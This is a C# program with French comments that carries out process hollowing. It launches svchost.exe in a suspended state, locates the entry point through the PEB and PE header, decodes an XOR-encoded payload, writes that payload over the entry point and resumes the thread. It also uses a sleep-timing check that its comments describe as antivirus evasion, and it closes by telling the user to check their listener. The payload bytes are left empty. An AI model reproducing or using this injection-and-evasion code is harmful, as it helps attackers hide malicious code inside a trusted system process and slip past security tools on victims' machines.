using System;
using System.Runtime.InteropServices;

namespace ProcessHollowing
{
    public class Program
    {
        // Constantes pour les drapeaux de création de processus
        public const uint CREATION_SUSPENDUE = 0x4;
        public const int INFORMATIONS_PROCESSUS_DE_BASE = 0;

        // Structure pour les informations sur le processus
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct InformationsProcessus
        {
            public IntPtr hProcess; // Handle du processus
            public IntPtr hThread; // Handle du thread principal du processus
            public Int32 IdProcessus; // ID du processus
            public Int32 IdThread; // ID du thread principal du processus
        }

        // Structure pour les informations de démarrage du processus
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct InformationsDemarrage
        {
            public uint cb; // Taille de la structure
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        // Structure pour les informations de base sur le processus
        [StructLayout(LayoutKind.Sequential)]
        internal struct InformationsProcessusBase
        {
            public IntPtr Reserved1;
            public IntPtr AdressePeb;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr PidUnique;
            public IntPtr MoreReserved;
        }

        // Importation des fonctions externes depuis les DLL système
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds); // Fonction Sleep

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref InformationsDemarrage lpStartupInfo, out InformationsProcessus lpProcessInformation); // Fonction CreateProcess

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
            ref InformationsProcessusBase procInformation, uint ProcInfoLen, ref uint retlen); // Fonction ZwQueryInformationProcess

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
            int dwSize, out IntPtr lpNumberOfbytesRW); // Fonction ReadProcessMemory

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten); // Fonction WriteProcessMemory

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread); // Fonction ResumeThread

        public static void Main(string[] args)
        {
            // Éviter la détection des antivirus : dormir pendant 10 secondes et vérifier si le temps s'est vraiment écoulé
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }

            // Payload XORé avec la clé 0xfa
            byte[] buf = new byte[511] {
                // Données du payload...
            };

            // Démarrer 'svchost.exe' en mode suspendu
            InformationsDemarrage sInfo = new InformationsDemarrage();
            InformationsProcessus pInfo = new InformationsProcessus();
            bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
                false, CREATION_SUSPENDUE, IntPtr.Zero, null, ref sInfo, out pInfo);
            Console.WriteLine($"'svchost.exe' démarré en mode suspendu avec l'ID {pInfo.IdProcessus}. Succès : {cResult}.");

            // Obtenir l'adresse mémoire du bloc de base du processus en pause (offset 0x10 depuis l'image de base)
            InformationsProcessusBase pbInfo = new InformationsProcessusBase();
            uint retLen = new uint();
            long qResult = ZwQueryInformationProcess(pInfo.hProcess, INFORMATIONS_PROCESSUS_DE_BASE, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.AdressePeb + 0x10);
            Console.WriteLine($"Informations sur le processus obtenues et adresse PEB localisée à {"0x" + baseImageAddr.ToString("x")}. Succès : {qResult == 0}.");

            // Obtenir le point d'entrée de l'exécutable réel
            // Cette partie est un peu compliquée car cette adresse diffère pour chaque processus (en raison de l'Address Space Layout Randomization (ASLR))
            // À partir du PEB (adresse obtenue lors de l'appel précédent), nous devons faire ce qui suit :
            // 1. Lire l'adresse de l'exécutable à partir des 8 premiers octets (Int64, offset 0) du PEB et lire le bloc de données pour le traitement ultérieur
            // 2. Lire le champ 'e_lfanew', 4 octets à l'offset 0x3C à partir de l'adresse de l'exécutable pour obtenir l'offset de l'en-tête PE
            // 3. Prendre la mémoire à cet en-tête PE et ajouter un offset de 0x28 pour obtenir l'offset de l'adresse virtuelle relative (RVA) du point d'entrée
            // 4. Lire la valeur à l'adresse de l'offset RVA pour obtenir l'offset du point d'entrée de l'exécutable à partir de l'adresse de l'exécutable
            // 5. Obtenir l'adresse absolue du point d'entrée en ajoutant cette valeur à l'adresse de base de l'exécutable. Succès !

            // 1. Lire l'adresse de l'exécutable à partir des 8 premiers octets (Int64, offset 0) du PEB et lire le bloc de données pour le traitement ultérieur
            byte[] procAddr = new byte[0x8];
            byte[] dataBuf = new byte[0x200];
            IntPtr bytesRW = new IntPtr();
            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
            IntPtr adresseExecutable = (IntPtr)BitConverter.ToInt64(procAddr, 0);
            result = ReadProcessMemory(pInfo.hProcess, adresseExecutable, dataBuf, dataBuf.Length, out bytesRW);
            Console.WriteLine($"DEBUG : Adresse de base de l'exécutable : {"0x" + adresseExecutable.ToString("x")}.");

            // 2. Lire le champ 'e_lfanew', 4 octets (UInt32) à l'offset 0x3C à partir de l'adresse de l'exécutable pour obtenir l'offset de l'en-tête PE
            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
            Console.WriteLine($"DEBUG : Offset e_lfanew : {"0x" + e_lfanew.ToString("x")}.");

            // 3. Prendre la mémoire à cet en-tête PE et ajouter un offset de 0x28 pour obtenir l'offset de l'adresse virtuelle relative (RVA) du point d'entrée
            uint rvaOffset = e_lfanew + 0x28;
            Console.WriteLine($"DEBUG : Offset RVA : {"0x" + rvaOffset.ToString("x")}.");

            // 4. Lire les 4 octets (UInt32) à l'offset RVA pour obtenir l'offset du point d'entrée de l'exécutable à partir de l'adresse de l'exécutable
            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
            Console.WriteLine($"DEBUG : Valeur RVA : {"0x" + rva.ToString("x")}.");

            // 5. Obtenir l'adresse absolue du point d'entrée en ajoutant cette valeur à l'adresse de base de l'exécutable. Succès !
            IntPtr adressePointEntree = (IntPtr)((Int64)adresseExecutable + rva);
            Console.WriteLine($"Adresse du point d'entrée de l'exécutable obtenue : {"0x" + adressePointEntree.ToString("x")}.");

            // Poursuite du processus, décoder la charge utile XORée
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }
            Console.WriteLine("Charge utile XORée décodée.");

            // Écraser la mémoire à l'adresse identifiée pour 'détourner' le point d'entrée de l'exécutable
            result = WriteProcessMemory(pInfo.hProcess, adressePointEntree, buf, buf.Length, out bytesRW);
            Console.WriteLine($"Point d'entrée écrasé avec la charge utile. Succès : {result}.");

            // Reprendre le thread pour déclencher notre charge utile
            uint rResult = ResumeThread(pInfo.hThread);
            Console.WriteLine($"Charge utile déclenchée. Succès : {rResult == 1}. Vérifiez votre écouteur !");
        }
    }
}

